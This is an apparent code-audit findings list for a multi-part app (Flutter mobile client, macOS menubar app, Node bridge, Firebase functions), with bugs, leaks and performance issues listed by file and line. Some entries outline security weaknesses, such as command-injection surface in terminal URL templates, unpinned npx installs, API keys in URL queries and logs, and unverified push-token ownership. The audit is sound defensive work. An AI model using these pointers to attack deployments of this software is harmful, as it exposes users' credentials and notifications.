- `B-6` **[bug]** `apps/mobile/lib/services/revenuecat_service.dart:610` — _updateState clears purchasingPackageId/isRestoring via null defaults, not sentinel
  errorMessage uses _copySentinel but purchasingPackageId defaults to null and isRestoring to false, so any _handleCustomerInfoUpdated push from the SDK during a purchase/restore wipes the loading state, letting the user tap purchase again mid-transaction.
- `A-6` **[leak]** `apps/mobile/lib/services/server_discovery_impl_io.dart:13` — eventStream.listen subscription never cancelled
  The StreamSubscription returned by discovery.eventStream?.listen is discarded; stopDiscovery only calls discovery.stop(). The subscription and its captured onResolved/onLost (indirectly holding ServerDiscoveryService) are never released.
- `A-7` **[leak]** `apps/mobile/lib/services/server_discovery_service.dart:43` — startDiscovery has no single-flight; dispose() does not await stop
  Two concurrent startDiscovery calls both see _discovery == null and each start a Bonsoir instance; the second overwrites _discovery, permanently leaking the first's multicast socket and timer. dispose() also drops the Future from stopDiscovery() and immediately closes the controller.
- `D-6` **[bug]** `apps/mobile/lib/services/ssh_startup_service.dart:371` — execute(): Completer double-completion, subscription leak, timeout without cancel, unbounded output
  If a stream fires onError then onDone the Completer completes twice throwing StateError in a stream callback (unhandled zone error); if awaiting stdoutDone throws, the stderr subscription is never cancelled. The outer .timeout(_commandTimeout) does not cancel the underlying work, and the BytesBuilder output has no size cap so a flood of remote output can OOM.
- `D-5` **[bug]** `apps/mobile/lib/services/support_banner_service.dart:47` — dismiss() does not call notifyListeners()
  The class extends ChangeNotifier and setDebugForceShowOverride notifies, but dismiss() does not, so widgets depending on the notifier do not rebuild after the user taps close.
- `A-5` **[leak]** `apps/mobile/lib/services/voice_input_service.dart:58` — dispose() does not clear statusListener; holds closure over destroyed State
  dispose only calls _speech.cancel(), leaving statusListener capturing the widget State's onDone. After the widget is destroyed the plugin can still invoke it, producing setState-after-dispose.
- `E11` **[logic]** `apps/mobile/lib/utils/composer_tokens.dart:390` — Token end never strips trailing punctuation; valid commands/mentions not highlighted
  _findTokenEnd stops only at whitespace, so '/help,' or '@lib/main.dart)' keeps the punctuation in rawText and _isTokenValid's set lookup fails, leaving legitimate slash commands and file mentions unhighlighted. This contradicts _isTokenBoundary already treating ([{:,; as start boundaries.
- `R-5` **[bug]** `apps/mobile/lib/utils/debug_bundle_share.dart:37` — 调试包含完整 git diff 与对话正文，UX 明确引导粘贴给第三方 AI
  copyDebugBundleForAgent 提示 'Agent prompt copied. Paste it into your AI chat.'，而 _buildDebugBundlePayload(:159-209) 含 historySummary（每条 assistant 正文/tool_result 前 100 字符）、debugTrace[].detail 与完整 git diff（上限 20000 字符），全部无脱敏。includeDiff 参数已存在但 UI 未暴露。
- **[perf]** `apps/mobile/lib/utils/diff_parser.dart:174` — parseDiff materializes all lines on main isolate with no size limits
  contains() full scan, then split('\n') materializing every line plus one DiffLine object per line, no line/byte cap, no compute() offload; opening a huge diff (lockfiles, generated code) blocks the main isolate for seconds with hundreds of MB peak (git_view_cubit.dart:86/108). Fix: caps with truncation notice, compute(), offset-based content.
- `D4/D5` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:265` — Header scan iterates all lines; added '++...' content lines misparsed as file path
  The +++/--- scan does not stop at the first '@@', so an added line whose content starts with '++' (Markdown '++highlight++', C++ '++i') appears as '+++...' and matches the bare '+++ ' branch, replacing the file path with hunk-body content.
- `A4/E07` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:313` — int.parse on hunk header numbers without tryParse; oversized values throw
  The regex \d+ allows arbitrarily long digit runs, so a header like '@@ -99999999999999999999,1 +1,1 @@' makes int.parse throw FormatException (or lose precision silently on dart2js), and parseDiff has no try/catch anywhere so the exception reaches git_view_cubit.
- `12/D-12/E4` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:361` — Empty lines unconditionally skipped in hunks, shifting all following line numbers
  The 'line.isEmpty' branch intended to eat the trailing split('\n') element also fires for blank context lines inside hunks whose trailing space was stripped (diffs from tool_result, mail/editor-processed patches). Such lines neither render nor increment oldLine/newLine, so every subsequent line number in the hunk is off by one and a context line disappears.
- `E08/E3` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:399` — _parseRawDiffLines silently drops lines whose content begins '++' or '--'
  An added line '+++i;' or removed line '---foo' matches none of the three branches (the +++/--- exclusions fire), so the line disappears from display and stats entirely. The file-header checks should require '+++ '/'--- ' with a trailing space or exact match.
- `A1/A21` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:558` — synthesizeEditToolDiff bare as String casts contradict documented null return
  file_path/old_string/content from wire JSON are cast with as String; a provider sending a number/object throws TypeError in the assistant_bubble.dart:841 build-path getter — whole bubble red-screens, despite docs promising null on malformed input. Fix: type-checked extraction + try/catch returning null.
- `A3` **[compat]** `apps/mobile/lib/utils/diff_parser.dart:585` — Strict 'edit is Map<String,dynamic>' check silently drops MultiEdit hunks
  Edits arriving as Map<dynamic,dynamic> (after Map.from/cast) or in a new list shape fail the strict generic check and are skipped without any error, so the UI shows an empty diff instead of the change or a failure notice.
- `D04/D3` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:666` — Path decode/encode asymmetry: reconstructed patches with special chars are unparseable
  _decodeGitPathToken decodes octal escapes and strips quotes, but _writeFileHeader writes the raw decoded path back with no re-quoting, so paths with spaces/non-ASCII/quotes/newlines round-trip into invalid patches. An empty filePath (default '' from _parseSingleFileDiff) yields 'diff --git a/ b/'.
- `D03/D1` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:688` — lastIndexOf(' b/') extracts wrong path when the path itself contains ' b/'
  For 'diff --git a/docs/a b/c.md b/docs/a b/c.md' the lastIndexOf hit lands inside the new path, returning 'c.md' instead of 'docs/a b/c.md'. Consequences: wrong isImageFile decision, wrong displayed filename, and reconstructDiff headers pointing at nonexistent files so git apply fails or request-change is silently dropped.
- `D2` **[bug]** `apps/mobile/lib/utils/diff_parser.dart:735` — Path-extraction fallback returns entire 'a/x b/x' line as the filePath
  When token splitting yields fewer than 2 tokens, the fallback returns the whole payload string ('a/x b/x') as the file path instead of failing, propagating a garbage path into display and reconstruction.
- **[perf]** `apps/mobile/lib/utils/history_window_policy.dart:110` — Two window functions duplicate full projection; O(n*m) merge with allocations
  selectTurnAwareChatEntryWindow and ...Indexes each rebuild the entire List<ServerMessage> (new AssistantMessage+TextContent for streaming entries) and run full projection without sharing results; caller loops _indexOfEquivalentEntry making it O(n*m) on every canonical/mirror merge, and _uniqueNonEmpty allocates 3 intermediate collections per message. Fix: share one projection; short-circuit bool for heavy-tool check.
- `C05` **[bug]** `apps/mobile/lib/utils/history_window_policy.dart:126` — List-index-based IDs (streaming-window-$index, history-tool-gap-$index)
  Prepending older history shifts every index so the same gap bubble changes id; downstream dedupe/ValueKey/scroll anchors treat them as new messages (rebuild + scroll jumps) and two on-screen sessions collide.
- `C1` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:245` — Gap/window IDs built from list index shift on prepend and collide across sessions
  'history-tool-gap-$sourceIndex' and 'streaming-window-$index' derive identity from list position, so paginating older history prepends entries and shifts every index, making dedupe/ValueKey/scroll-anchor consumers treat old bubbles as new (rebuilds, scroll jumps, duplicates). The IDs also lack provider/bridgeInstanceId/sessionId, so two sessions rendered concurrently collide.
- `A5/G06` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:291` — Empty-id ToolUseContent silently deleted with no gap record
  A tool_use with empty/blank id fails the retain condition and also fails the omitted-tools condition, so it vanishes entirely without even the 'N tools omitted' placeholder. Inconsistently, the ToolResultMessage branch at L364-369 always retains empty toolUseId, so the same empty ID is dropped in one place and kept in another.
- `E03/E5` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:405` — UserInputMessages selected without quota: cap breachable, latest replies droppable
  The first loop adds every UserInputMessage index unconditionally; if their count reaches limit, the second loop's guard is false from the start, so the returned set exceeds maxRetainedEntries and contains zero assistant messages, including the newest reply. Reachable when a caller passes a large rootTurns (clamped up to 755).
- `C04/C2` **[logic]** `apps/mobile/lib/utils/history_window_policy.dart:419` — historyToolDetailGapId hashes only toolUseIds: cross-session collisions, order-sensitive
  The gapId includes no provider/bridgeInstanceId/sessionId/sourceHome, so two Bridges or sessions with the same short tool-id sets (Codex call_1/item_0 style) produce identical gapIds and collide in caches/GlobalKeys. jsonEncode of the list is also order-sensitive so the same omitted set can yield different gapIds across replays.
- **[perf]** `apps/mobile/lib/utils/request_user_input.dart:33` — Approval card render triggers 4-5 full re-parses of the questions structure
  firstRequestUserInputQuestion, requestUserInputOptionLabels, requestUserInputHeader, requestUserInputQuestionText, hasRequestUserInputQuestions and isMcpApprovalRequestUserInput each re-run the full parse with Map.from copies per question. Fix: cache the parsed result or parse once at the caller.
- `A23` **[logic]** `apps/mobile/lib/utils/request_user_input.dart:41` — One invalid question item silently discards ALL questions
  Validation returns const [] on any single bad item, completely silently: the user sees an empty card and never knows the agent is waiting for input. Fix: skip bad items with continue; show a degraded visible hint if all fail.
- `D01/SEC-8` **[bug]** `apps/mobile/lib/utils/terminal_launcher.dart:16` — Terminal URL template substitutes values unencoded; Uri.parse outside try
  host/user/projectPath are spliced raw into URL templates: spaces/&/# break the URL structure, and shell metacharacters in a semi-trusted remote projectPath can flow into terminal apps' cmd= query params as command injection surface; a malformed result throws FormatException from Uri.parse which sits outside the try. Fix: Uri.encodeComponent per placeholder, Uri.tryParse, character whitelist.
- `F06` **[logic]** `apps/mobile/lib/utils/tool_categories.dart:30` — Alias sets inconsistent between display name and categorization
  getToolDisplayName recognizes spawn_agent/wait lowercase variants but categorizeToolName only PascalCase — correct title but generic wrench icon; getToolCollapsedSummary falls to 'other' returning '' and losing agent_name; _waitSummary (381-388) is unreachable for 'wait'.
- `F2` **[logic]** `apps/mobile/lib/utils/tool_categories.dart:166` — Display-name and category tables accept different alias sets
  getToolDisplayName recognizes camelCase/snake_case variants (spawn_agent, sendInput, wait) but categorizeToolName only matches PascalCase, so e.g. Codex's spawn_agent shows the right title with a generic wrench icon, an empty collapsed summary losing agent_name, and lowercase 'wait' never reaches _waitSummary. A single _canonicalToolName should feed both tables.
- `F1` **[bug]** `apps/mobile/lib/utils/tool_categories.dart:218` — SubAgent default branch returns literal 'SubAgent' instead of normalized inner tool
  normalized is computed from input['tool'] for SubAgent, but the switch's default returns name (the literal 'SubAgent') rather than normalized, so any unknown inner sub-agent tool collapses to an indistinguishable 'SubAgent' label, breaking the forward-compatibility the doc comment promises. _completedToolDisplayName's equivalent default is correct.
- `D6` **[compat]** `apps/mobile/lib/utils/tool_categories.dart:329` — basename logic only splits '/': Windows paths shown whole, trailing slash yields empty
  Both helpers use lastIndexOf('/')/contains('/'), so a Windows Bridge path like C:\Users\x\main.dart is returned in full (blowing up the summary bar) and a path ending in '/' returns an empty string. No tilde expansion, case normalization, or URL decode, and the style diverges from _fileFullInput.
- `3.1-2` **[bug]** `apps/mobile/lib/widgets/assistant_bubble.dart:216` — inferred error 分支丢弃 widget.timestamp
  短文本被 inferStructuredErrorCode 判为错误时直接 `return ErrorBubble(...)`，timestamp 被丢弃；真实 ErrorMessage entry（error_bubble.dart:75-79）同样无时间。用户看不到错误发生时刻。
- `3.1-3` **[bug]** `apps/mobile/lib/widgets/assistant_bubble.dart:400` — 无正文的 Plan/Card 消息没有时间（受 hasTextContent 门槛约束）
  时间只经 MessageActionBar 呈现且受 `if (hasTextContent)` 约束。ExitPlanMode 若无 TextContent（真实 SDK 把计划写入文件的形态，见 :316-321 注释），PlanCard 展示但无操作栏 → 无时间。
- `M-15` **[bug]** `apps/mobile/lib/widgets/auxiliary_floating_dock.dart:39` — 悬浮小窗仍是 48px 按钮 + 模态 bottom sheet，与产品定义的非模态小窗不符
  当前是 _size = 48.0 的按钮 + showModalBottomSheet + FractionallySizedBox(heightFactor: 0.86) 的模态实现；用户重新确认的定义是"非模态可展开小窗"，展开时窗外聊天/输入框/滚动应仍可操作。需按 v02-002 改为会话页 Stack/Overlay 内的局部 surface。
- `3.1-1` **[bug]** `apps/mobile/lib/widgets/tool_result_bubble.dart:26` — 孤立 ToolResultBubble 完全没有时间显示
  ServerMessageWidget 收到了 timestamp（message_bubble.dart:137），但构造 ToolResultBubble 时未传递，组件本身也无 timestamp 参数。折叠态与展开态头行均无时间，与折叠组的呈现不一致。
- `D5` **[compat]** `apps/mobile/pubspec.yaml:41` — marionette_flutter (UI automation) ships in production dependencies
  The automation framework is a runtime dependency so its code is linked into release builds even though MarionetteBinding.ensureInitialized() is kDebugMode-guarded. Move to dev_dependencies if supported, or verify no automation entry points are exposed in release artifacts.
- `D4` **[compat]** `apps/mobile/pubspec.yaml:46` — flutter_markdown is discontinued and receives no fixes
  The package is officially discontinued (including for security fixes) while the project has 682 lines of customization on top of it in markdown_style.dart. Plan migration to flutter_markdown_plus or markdown_widget; at minimum record the risk and pin the version.
- `3.3-test` **[test-gap]** `apps/mobile/test/features/chat_session/` — 缺少"两个无 UUID、文字相同、图片/时间不同的 user turn"回归测试
  现有测试覆盖了有 UUID 的重复 prompt 和重复 assistant text，但没有覆盖无 UUID 同文本场景，正是这个空档让 3.3 的 provenance 漂移通过全绿测试。
- `5.1-v02-009.1` **[test-gap]** `apps/mobile/test/widgets/message_timestamp_test.dart:47` — 时间戳测试仍缺气泡内位置断言、窄屏截断检测与长工具名溢出回归
  341b2a26 已补 descendant 断言与 timestamp.dx < chevron.dx，但仍缺：气泡内具体位置断言、窄屏视觉截断检测（现只断言 takeException == null）、长工具名 + timestamp 的溢出回归。3.1-6 的 RenderFlex 溢出正是因此逃逸。

### menubar

- `C10` **[bug]** `apps/menubar/CCPocketMenubar/CCPocketMenubar.entitlements:1` — App Sandbox not enabled for an app that spawns zsh/npm/brew
  Entitlements contain only network.client, no com.apple.security.app-sandbox, so a tampered ~/.zshrc or any spawned tool runs with the app's full user privileges and no file-scope limits; Mac App Store distribution is impossible. Report recommends documenting the non-sandboxed posture and moving command execution into an XPC helper to shrink the attack surface.
- `C17` **[bug]** `apps/menubar/CCPocketMenubar/Info.plist:4` — Handwritten Info.plist lacks CFBundleShortVersionString/CFBundleVersion injection
  The plist contains only LSUIElement; project.yml defines MARKETING_VERSION/CURRENT_PROJECT_VERSION but neither GENERATE_INFOPLIST_FILE nor INFOPLIST_KEY_* is set, so the built product likely ships without version keys. Notarization and SMAppService both depend on those keys, so the artifact is broken as configured.
- `C15` **[l10n]** `apps/menubar/CCPocketMenubar/Localizable.xcstrings` — Menubar app localized only in en+ja; no zh-Hans/zh-Hant/ko
  sourceLanguage en with 125 keys and only a ja localization; Chinese-facing distribution needs 125 zh-Hans entries. About 8 keys (Git, Keychain access, etc.) are Bridge doctor check names resolved via runtime lookup that the compiler does not extract, requiring manual sync when Bridge adds checks.
- **[l10n]** `apps/menubar/CCPocketMenubar/Localizable.xcstrings` — xcstrings covers only en+ja (125 keys); no zh-Hans/zh-Hant/ko
  sourceLanguage is en with ja at 125/125 coverage and no other locales, so Chinese users get an all-English app. About 8 keys (Git, Keychain access, Screen Recording, etc.) are runtime-dynamic doctor-check names via DoctorReport.swift:25-31 that the compiler cannot extract, so they must be manually synced when Bridge adds checks.
- `C11` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:13` — All subprocesses use zsh -li, sourcing user .zshrc on every probe
  BridgeProcessManager.swift:13-14 and DoctorRunner.swift:29-30 always spawn `zsh -li -c`, so every probe (including npm view on each panel open) executes arbitrary user shell config; `-i` without a TTY can also emit job-control/compinit noise or block waiting for input. Switch to `zsh -lc` or build PATH explicitly.
- `C8` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:81` — npx --yes @ccpocket/bridge@latest and npm install -g run unpinned (supply chain)
  Four sites (BridgeProcessManager.swift:81,89,94; DoctorRunner.swift:30) execute `npx --yes @ccpocket/bridge@latest` or `npm install -g`, skipping confirmation and never pinning a version. A poisoned npm package or stolen publisher account executes on a single Update click. Install explicit versions and verify signatures.
- `C18` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:146` — Programmatic 'claude auth login' vs copy-to-user 'claude login' command mismatch
  BridgeProcessManager.swift:146 executes `claude auth login` while DoctorViewModel.swift:358 copies `claude login` for the user; the real CLI subcommand is `claude login`, so the programmatic path is likely wrong. `codex --login` (lines 148/360) likewise needs verification against `codex login`. Extract a single constant and add a snapshot test.
- `C12` **[bug]** `apps/menubar/CCPocketMenubar/Services/BridgeProcessManager.swift:213` — Raw subprocess stdout/stderr tail surfaced verbatim as UI error text
  ProcessError falls back to `String(trimmed.suffix(200))` and DoctorError.parseFailed emits the first 200 chars of raw output, shown directly in DoctorPageView/OnboardingView. Failed `claude auth login`/`codex --login`/npm runs commonly contain absolute home paths, registry auth errors, token fragments, and proxy addresses. Whitelist error mappings and redact paths/credentials.
- `C14` **[perf]** `apps/menubar/CCPocketMenubar/ViewModels/AppViewModel.swift:120` — Every successful health check forks a login shell to hit npm registry, no cache
  checkHealth() unconditionally chains checkForBridgeUpdate → `zsh -li -c "npm view @ccpocket/bridge version"`, sourcing the whole .zshrc plus a network round-trip (1-3s+) with no dedup or throttle. Add a 24h timestamp cache or replace with a direct URLSession call to registry.npmjs.org.
- `C9/F14` **[logic]** `apps/menubar/CCPocketMenubar/ViewModels/QRCodeViewModel.swift:15` — bridgePort/bridgeApiKey UserDefaults keys are read (3 sites) but never written anywhere
  QRCodeViewModel.swift:15,20 and BridgeClient.swift:12 read these keys, but no code ever writes them and there is no settings UI. Users who ran `bridge setup --port 9000` or set BRIDGE_API_KEY get a menubar app stuck on 8765 with a token-less QR and 'Bridge Not Running' panels. Add a settings pane (key in Keychain) or parse the launchd plist EnvironmentVariables.
- `C13` **[bug]** `apps/menubar/CCPocketMenubar/Views/PopoverContentView.swift:39` — onAppear fires only once; panel shows stale health/usage on every reopen
  The NSHostingView is created once at launch and the panel is hidden/shown via orderOut/orderFrontRegardless, which does not retrigger SwiftUI appear, so checkHealth() and fetchUsage() likely run only on first open. Second and later clicks on the status item show stale status light and usage data. Refresh VMs explicitly from AppDelegate.openPanel() or use NSPopover/MenuBarExtra.

### Other

- `D3` **[test-gap]** `.github/workflows/test.yml:1` — Only pull_request-triggered workflow lacks a permissions: block
  test.yml uses the repository default GITHUB_TOKEN permissions (possibly write-all) while all 8 release workflows set permissions correctly; add permissions: contents: read.
- `D2/L-2` **[test-gap]** `.github/workflows/test.yml:74` — CI runs dart analyze without --fatal-infos; all lint violations pass
  Dart treats info-level diagnostics as non-fatal and flutter_lints mostly emits infos, so no lint violation, including avoid_hardcoded_japanese, ever fails CI; the local hook is the only defense.
- `S-8` **[bug]** `functions/src/index.ts` — FCM token 归属未验证，App Check 为 no-op
  任意客户端可注册他人 token 或注销他人 token，可用于劫持/静默他人推送。App Check 实现为 no-op，未提供任何客户端完整性保证。
- `A-3` **[logic]** `functions/src/index.ts:396` — Legacy tokens without locale only receive pushes when notify locale is en
  tokenLocale == null returns body.locale === 'en', but if the bridge's registered token set contains no en-locale token (e.g. only a Chinese phone), getRegisteredLocales() never produces 'en' and the legacy token is permanently silent. Needs an en fallback send or per-token locale bucketing inside CF.
- `C-2` **[leak]** `functions/src/index.ts:497` — CF deletes dead tokens from Firestore but never tells the Bridge
  After registration-token-not-registered the CF removes the Firestore doc but the Bridge's in-memory locale/privacy/enabledEventTypes entries for that token persist forever: notify calls keep going out for dead locales (burning rate limit), isPrivacyMode stays polluted by uninstalled devices, and hasExplicitPushSubscriber('session_progress') can stay permanently true. The notify response's deletedInvalidTokens should be extended to list tokens so the Bridge can clean its three maps.


## P3（238 条）

### Bridge

- `S-11` **[bug]** `packages/bridge/src/bridge-http-auth.ts:86` — API key 经 URL query ?token= 传递，启动时明文 deep link + 二维码打到 stdout
  startup-info.ts:56-60,121-133 把含 token 的 deep link 与二维码打印到 stdout，launchd 日志永久留存明文凭据。应支持 Authorization: Bearer（Dart WS 支持自定义 header）并对日志打码。
- `E8` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:1273` — Five silent catch{} blocks discard JSON parse failures in rollout processing
  At 1273-1277, 1472-1476, 2555-2557, 2563-2565, and 2723-2725 parse failures are swallowed with empty catches; a corrupted rollout file manifests only as 'some Desktop messages didn't sync' with zero diagnostics.
- `D11` **[bug]** `packages/bridge/src/codex-desktop-continuity.ts:2780` — remember() doesn't refresh LRU position on existing key; stale fence can be evicted
  When used for staleRuntimeSessionIds (cap 256), re-remembering an existing key keeps its old LRU slot, so a long-stale but active session can be pushed out by new entries, silently disabling its stale fence.
- `22` **[logic]** `packages/bridge/src/codex-process.ts:1028` — Thread-settings pending cleanup duplicated between reader and writer (race-prone)
  waitForPendingThreadSettingsUpdate/waitForPendingRuntimeThreadSettingsUpdate (readers) also null out _pendingThreadSettingsUpdate, duplicating the writer-side cleanup in the void operation.then handlers (910-921/1078-1082). Currently idempotent and harmless, but the split state ownership makes any future change to either side likely to introduce a race.
- `21` **[perf]** `packages/bridge/src/codex-process.ts:3334` — Completion entities signature re-serializes full metadata with JSON.stringify each time
  emitCompletionEntitiesSnapshot stringifies the entire skillMetadata+appMetadata+pluginMetadata on every invocation; skills/changed and app/list/updated notifications can arrive frequently (1s cooldown), making this a repeated synchronous serialization cost on large skill sets.
- `20` **[leak]** `packages/bridge/src/codex-process.ts:3383` — Unreachable !input branch would leak tempPaths; dead void completion statement
  toRpcInput always pushes at least a text item so 'if (!input) continue' at 3383-3385 is dead code, but if ever triggered it skips tempPaths cleanup (all other exits at 3406-3408/3511-3513 rm them); 'void completion;' at 3514 acts on an already-awaited undefined. The core report's A10 treats the missing rm on this branch as a real temp-file leak path.
- `19` **[bug]** `packages/bridge/src/codex-process.ts:4976` — handleServerRequestResolved strict === requestId compare breaks on number/string drift
  params.requestId (unknown) is compared with === against PendingApproval.requestId (number|string) with no normalization; if the app-server serializes a numeric id as a string (or vice versa) the match fails, the pending entry is never cleaned, permission_resolved is never emitted, and status stays waiting_approval. Also core-report E13.
- `B-17` **[perf]** `packages/bridge/src/conversation-content-sync.ts:238` — scoped change 不更新 catalog 记录的 modified，同一变化被二次全量读
  scoped change 直接 enqueue 但不更新 catalog.modified；下次 refreshCatalog 比对 previous.modified !== record.modified 会对同一变化再次 enqueue cold_revision。发布因 revision 相同被跳过，但两次全量 history 读的 I/O 已经白费。
- `B-19` **[leak]** `packages/bridge/src/conversation-content-sync.ts:274` — close() 不清 snapshots/catalog；user_input 无上限；截断可劈开 surrogate pair
  close() 只清 clients/queue/timers；boundHistoryMessage 只约束 tool_result/assistant，user_input 文本不设上限；paginateEntries 允许单条超大 entry 突破 maxPageBytes；snapshot 总量无字节上限；boundedText 的 `end = Math.floor(end*0.9)` 截断可能劈开 surrogate pair 产生非法 UTF-16。
- `10/C10` **[bug]** `packages/bridge/src/file-transfer-http.ts:303` — Upload abort listens only to deprecated req 'aborted', not res 'close'
  handleUpload registers only req.once('aborted'); if the response-side socket closes without triggering aborted, the transfer lock stays held until the 60s idle timer, blocking the client's immediate resume PATCH for up to a minute. handleSendControl correctly also registers res.once('close').
- `7/C7` **[leak]** `packages/bridge/src/file-transfer-manager.ts:426` — Failed receives occupy download slots 7 days; at 256 cap offerFile returns 500
  handleReceiveResult only removes the entry when success && receivedBytes === sizeBytes, but the mobile failure path sends receivedBytes: 0, so failed downloads persist until retainUntil (7 days). With DEFAULT_MAX_DOWNLOADS=256, upsertDownload throws a plain Error at capacity and offerFile becomes a 500; same root cause as finding 2.
- `11/C11` **[logic]** `packages/bridge/src/file-transfer-manager.ts:568` — upload_result dropped if WS is disconnected at completion moment
  sendCompletedUpload returns silently when uploadClients has no owner binding (disconnect() clears bindings), so a completion coinciding with a WS drop is lost; recovery relies solely on the phone re-preparing and hitting the completion tombstone, whose survival is constrained by finding 2's capacity/retention. A short-lived pending-delivery queue drained on reconnect would fix it.
- `9/C9` **[perf]** `packages/bridge/src/file-transfer-upload-store.ts:311` — Active-upload cap checked inside transfer lock; no HTTP-level upload gate
  The activeUploads >= maxActiveUploads (default 2) check happens after acquiring the transfer lock, auth, and reconcile, so it only bounds concurrent disk writers, not queued requests; the download side reserves a slot synchronously at the HTTP layer but uploads have no equivalent, and multiple PATCHes for one transferId pile up unbounded on the lock queue.
- `8/C8` **[perf]** `packages/bridge/src/file-transfer-upload-store.ts:441` — Every chunk triggers 2-3 full state-file rewrites with double fsync
  Each PATCH writes journal and offset separately (plus rollback paths), and each write serializes the full up-to-8MiB JSON to a temp file with handle.sync(), rename, chmod, and directory fsync. A 15GiB upload with adaptive small chunks produces tens of thousands of full rewrites: heavy write amplification and latency, though crash-safe semantically.
- `S-14` **[bug]** `packages/bridge/src/git-operations.ts:683` — createBranch/checkoutBranch 未拒绝 `-` 开头的分支名
  分支名以 `-` 开头会被 git 当作选项解析。argv 形式使其难以实际利用，属纵深防御缺口；应加 `--` 分隔或分支名正则白名单。
- `20/D-20` **[bug]** `packages/bridge/src/git-operations.ts:700` — Newline filenames split wrongly in revertFiles; ' b/' path parse mismatch breaks image diffs
  revertFiles splits ls-files output on \n, so a filename containing a newline is misclassified as untracked and deleted via git clean -fd (should use -z). Separately, the client's _extractFilePath uses lastIndexOf(' b/') while the Bridge regex takes the first ' b/', so filenames like 'x b/y.png' parse differently on each side and image diffs silently degrade to 'Binary file'.
- `S-15` **[bug]** `packages/bridge/src/mdns.ts:53` — mDNS TXT 广播 auth 字段，告知同网段是否已设 API key
  TXT 记录含 auth: "required"|"none"，向同网段公开认证状态便于挑选无认证目标。darwin 默认不广播，实际风险低。
- `C-10` **[compat]** `packages/bridge/src/parser.ts` — 新长度校验令 parseClientMessage 返回 null，Bridge 静默丢请求且 app 无兜底
  02128669 新增的校验对 searchQuery > 512、requestId > 128 直接返回 null，Bridge 静默丢弃。app 端搜索框未截断、目录请求无超时 → 粘贴超长文本进搜索框则骨架屏无限等待。
- `12` **[perf]** `packages/bridge/src/parser.ts:1126` — No input size limit; ws maxPayload defaults to 100MiB, sync parse blocks event loop
  parseClientMessage JSON.parses the full string with no length cap and websocket.ts:1393 creates WebSocketServer without maxPayload, so a single 100MB malformed JSON synchronously blocks the event loop; backup_prompt_history.data and record_prompt_history.text are also persisted with no size cap. Also core-report B13.
- `11` **[bug]** `packages/bridge/src/parser.ts:2384` — return msg as unknown as ClientMessage passes undeclared fields through
  Only 7 of 60+ message types use hasOnlyKeys; for the rest, arbitrary extra fields on the raw JSON.parse object flow into handlers and are persisted by recording-store. This is the systemic root of items 5/6/7 — validation passing does not mean the object matches the declared type. Also core-report B12 and second-pass B1.
- `A-8` **[perf]** `packages/bridge/src/push-relay.ts:81` — Locale fan-out multiplies notify calls against a global 30/60s rate limit
  One business event becomes N notify HTTP calls (one per locale) while RATE_LIMIT_NOTIFY_MAX=30/60s is bridge-global; multi-language plus concurrent sessions trips 429 early and notifications are silently dropped (bridge only console.warns).
- `C-6` **[bug]** `packages/bridge/src/push-relay.ts:101` — bridgeId (Firebase UID) printed to stdout logs
  The UID lands in Bridge logs (and websocket.ts:4809-4811 logs platform/locale/privacy), reducing anonymity during incident forensics; no token is printed, but the UID should be redacted or truncated.
- `15` **[logic]** `packages/bridge/src/sdk-process.ts:626` — _projectPath is write-only dead field
  private _projectPath is assigned at 652 and never read anywhere in the file (all other _projectPath references belong to codex-process.ts). Either remove it or use it as codex-process does.
- `16` **[bug]** `packages/bridge/src/sdk-process.ts:1095` — listAvailableModels() lacks try/catch, inconsistent with rewindFiles error handling
  Unlike the adjacent rewindFiles() (1083-1093) which handles its own errors, listAvailableModels has no try/catch so exceptions propagate raw into the WebSocket handler.
- `B-20` **[perf]** `packages/bridge/src/session-catalog-monitor.ts:292` — durable identity 的 `uuid ?? stem` 回退把 rollout-2026-… 当 providerSessionId 下发
  随后对其 getCodexSessionHistory(garbage) → 全树扫描 + 逐文件流读后落空。该文件每次变化都白扫一遍。正则不匹配时应降级为 unscoped，不携带垃圾 id。
- `A8` **[logic]** `packages/bridge/src/session.ts:1207` — create() writes codexSettings object with all-undefined keys, making later ?? fallback dead code
  Because create() fully overwrites codexSettings (including undefined-valued keys), the object is always truthy and the s.codexSettings ?? (process.codexPermissionsMode...) fallback at session.ts:1339-1347 can never fire. No current misbehavior but a hidden contract hole.
- `C10` **[leak]** `packages/bridge/src/session.ts:1660` — pendingCodexUserEchoUuids is an unbounded Set
  UUIDs are only removed on successful merge; echoes that never arrive accumulate until session destruction with no cap or TTL.
- `B-21` **[logic]** `packages/bridge/src/sessions-index.ts:1355` — includeInternal=false 路径缺祖先 meta 过滤，fork 条目顶着父 threadId 出现
  `payload.id !== fallbackSessionId` 的祖先过滤只在 includeInternal=true 分支。recent 扫描路径下，fork 文件的祖先 meta 排在子 meta 之后时条目会顶着父 threadId 出现，与真父会话在 B-14 的去重中互相吞并。
- `S-13` **[leak]** `packages/bridge/src/websocket.ts:1215` — debugEvents 等以 sessionId 为键，单会话有上限但会话数量本身无上限
  单会话 800 条上限，但反复 start 可线性增长内存并 spawn 子进程，Map 条目在会话销毁时未清理。需最大并发会话数 + 销毁时清理。
- `S-12` **[bug]** `packages/bridge/src/websocket.ts:3760` — JSON.parse 失败时打印 raw.slice(0,200)，含密码的截断消息明文入日志
  含密码的消息若因传输截断而解析失败，前 200 字节原样进日志。应只打印长度与前 32 字节哈希。
- `C-17` **[logic]** `packages/bridge/src/websocket.ts:7054` — catalogRevision 在异步列举的 .then 回调里读取，把旧内容标记为新 revision
  `catalogRevision: this.sessionCatalogMonitor.currentRevision ?? 0` 在列举完成后才求值；列举期间 monitor 完成新一轮扫描时，响应把旧内容打上新 revision。与 C-18 组合会把旧列表固化为"当前 revision 的完整缓存"。
- `S-16` **[bug]** `packages/bridge/src/websocket.ts:8296` — 错误分支普遍 String(err) 原样回显，泄露完整绝对路径
